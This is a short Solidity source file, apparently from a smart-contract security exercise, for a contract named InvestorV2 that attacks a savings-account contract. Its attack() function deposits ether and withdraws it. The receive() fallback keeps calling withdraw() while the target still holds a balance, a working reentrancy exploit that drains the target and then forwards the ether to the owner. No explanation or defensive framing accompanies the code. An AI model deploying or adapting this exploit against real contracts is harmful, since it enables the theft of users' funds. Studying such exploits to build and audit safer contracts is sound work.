// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISavingsAccountV2 {
    function deposite() external payable;
    function withdraw() external;
}

contract InvestorV2 is Ownable {
    ISavingsAccountV2 public immutable savingsAccountV2;

    constructor(address savingsAccountV2Address) {
        savingsAccountV2 = ISavingsAccountV2(savingsAccountV2Address);
    }

    function attack() external payable onlyOwner {
        savingsAccountV2.deposite{value: msg.value}();
        savingsAccountV2.withdraw();
    }

    // function depositeIntoSavingsAccount() external payable onlyOwner {
    //     savingsAccount.deposite{ value: msg.value }();
    // }

    // function withdrawFromSavingsAccount() external onlyOwner {
    //     savingsAccount.withdraw();
    // }

    receive() external payable {
        if(address(savingsAccountV2).balance > 0) {
            savingsAccountV2.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}